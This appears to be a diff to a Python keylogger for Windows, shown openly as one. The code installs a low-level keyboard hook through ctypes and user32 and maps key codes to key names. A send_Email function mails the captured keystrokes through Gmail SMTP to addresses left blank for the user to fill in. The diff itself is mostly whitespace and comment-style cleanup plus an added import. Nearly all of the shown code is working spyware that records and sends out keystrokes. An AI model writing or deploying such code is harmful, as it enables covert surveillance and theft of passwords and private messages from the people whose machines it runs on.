@@ -3,6 +3,8 @@ from ctypes import *
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 import smtplib
+import platform
+
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -12,14 +14,15 @@ WM_KEYDOWN = 0x0100
 CTRL_CODE = 162
 log = ''
 
+
 def send_Email(msg):
 
-    gmail_user = '' #enter e-mail you want to be sent
-    gmail_password = '' #enter password for user e-mail
+    gmail_user = ''  # enter e-mail you want to be sent
+    gmail_password = ''  # enter password for user e-mail
 
-    sent_from = gmail_user  
-    to = ['', '']  #enter e-mail
-    subject = 'Rofl'  
+    sent_from = gmail_user
+    to = ['', '']  # enter e-mail
+    subject = 'Rofl'
     body = msg
 
     email_text = """\  
@@ -30,14 +33,14 @@ def send_Email(msg):
     %s
     """ % (sent_from, ", ".join(to), subject, body)
 
-    try:  
+    try:
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
         server.login(gmail_user, gmail_password)
         server.sendmail(sent_from, to, email_text)
         server.close()
         print('Email sent!')
-    except smtplib.SMTPException:  
+    except smtplib.SMTPException:
         server = smtplib.SMTP_SSL('smtp.gmail.com', 587)
         server.ehlo()
         server.login(gmail_user, gmail_password)
@@ -46,9 +49,6 @@ def send_Email(msg):
         print('Email sent!')
     except:
         pass
-    
-
-
 
 
 class KeyLogger:
@@ -84,15 +84,15 @@ class KeyLogger:
         249108103188: 'Capital',
         4294967323: 'Escape',
         244813135904: ' ',
-        #33: 'Prior',
-        #34: 'Next',
+        # 33: 'Prior',
+        # 34: 'Next',
         339302416419: 'End',
         304942678052: 'Home',
         322122547237: 'Left',
         309237645350: 'Up',
         330712481831: 'Right',
         343597383720: 'Down',
-        360777252908: 'Snapshot', #PRTSCR
+        360777252908: 'Snapshot',  # PRTSCR
         356482285614: 'Delete',
         47244640304: '0',
         8589934641: '1',
@@ -161,10 +161,10 @@ class KeyLogger:
         292057776249: 'F10',
         373662154874: 'F11',
         377957122171: 'F12',
-        296352743568 : 'Numlock',
-        180388626592 : 'Lshift',
-        231928234145 : 'Rshift',
-        124554051746 : 'Lcontrol',
+        296352743568: 'Numlock',
+        180388626592: 'Lshift',
+        231928234145: 'Rshift',
+        124554051746: 'Lcontrol',
         124554051747: 'Rcontrol',
         # 164: 'Lmenu',
         # 165: 'Rmenu',
@@ -189,11 +189,13 @@ class KeyLogger:
         240518168740: 'Alt',
         180388626592: 'Shift',
         390842024027: 'Win'
-        }
+    }
+
 
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
+
 
 def hookProc(nCode, wParam, lParam):
     if wParam is not WM_KEYDOWN:
@@ -221,11 +223,9 @@ def hookProc(nCode, wParam, lParam):
     return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
 
 
-
 def startKeyLog():
     msg = MSG()
     user32.GetMessageA(byref(msg), 0, 0, 0)
-
 
 
 KeyLogger = KeyLogger()
@@ -234,8 +234,4 @@ if KeyLogger.installHookProc(pointer):
     print("Hook installed")
 
 
-
-
-
 startKeyLog()
-
